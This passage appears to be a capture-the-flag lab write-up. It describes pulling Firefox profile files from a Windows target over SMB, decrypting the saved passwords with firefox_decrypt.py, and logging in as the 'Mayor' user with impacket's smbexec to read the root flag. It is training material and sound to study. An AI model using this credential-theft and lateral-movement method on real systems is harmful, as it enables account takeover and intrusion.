Now our goal is to get the root user's flag. My immediate thought is to find out what other users exist. 

![[other users.png]]

Can't be that easy. At least now we know who's flag we're trying to get. The mayor!
### **Orientation to Environment**

If you aren't sure what commands are available to you in this environment, you can usually type "help" to get a list. 

![[help options.png]]

This is not the complete list for this room, but just a screenshot to show you - it's always helpful to know what resources are immediately available to you when you gain a foothold. 

Another quick orientation tip for windows environments: run `systeminfo`

![[systeminfo.png]]

Moving on, I noticed another interesting file on our current user's desktop. ***Firefox.lnk***
Let's grab that by adding it to the existing smb share. 

![[copy firefox.lnk to share.png]]

Now we can log in to the share using the following command as before:
```
smbclient \\\\10.10.222.129\\Users 
```
 Then download the ***Firefox.lnk*** file to our kali machine.

![[mget link.png]]

Once we have this let's continue investigating.
If you try to click the link we downloaded, it won't do anything useful. 
So let's take a deeper look at it using the `more` and `file` commands:

![[more link.png]]

![[file link.png]]

From these screenshots we can see a few things:
1. A file path to investigate `AppData\Local\Mozilla\Firefox`
2. This link is a shortcut to a relative path, which explains why it isn't doing anything on our kali machine. 

Back in our user's profile we can run the `dir /a` command to see if we can find the 'AppData' directory.

![[dir all.png]]

Now let's see if we can follow this rabbit hole to something useful.

![[found firefox profiles.png]]

I found some profiles. Let's keep digging...

![[nothin here.png]]

Well, nothing here. Let's try the other profile...

![[nothing here either.png]]

### **Re-Orientation to Objective**

At this point I'm going to recalibrate to what my objective is here. I'm trying to get access to the root users data. 
I read a bunch of walkthroughs and everyone was using a Metasploit module called "loot" to get the required files for decrypting Firefox credentials. So after talking to a friend he enlightened me that I can look at that Metasploit module's ruby script and see what files it's searching for. 

So let's take a look at this script:

![[ruby script location.png]]

Here's where it's looking and what it's looking for:

![[metasploit firefox script.png]]
### **Gathering Essential Files**

So that's where we're going and what we're going to get. It looks like we were looking in the wrong directory previously. We should have been looking in "Roaming" directory instead of "Local". 

![[Files needed for creds.png]]

Just copy the files to the existing share:

![[copy to share.png]]

Log back in to the SMB share and download the files:

![[smb creds download.png]]

### **Exploitation**

Download the python script ***firefox_decrypt.py*** to get Mayor's credentials.

![[firefox_decrypt.png]]

Login with ***smbexec***

![[cant cd in smbexec.png]]

Navigate to Mayor's desktop and read the root flag.

![[type root flag.png]]

Complete!
# References

https://github.com/unode/firefox_decrypt

https://github.com/fortra/impacket/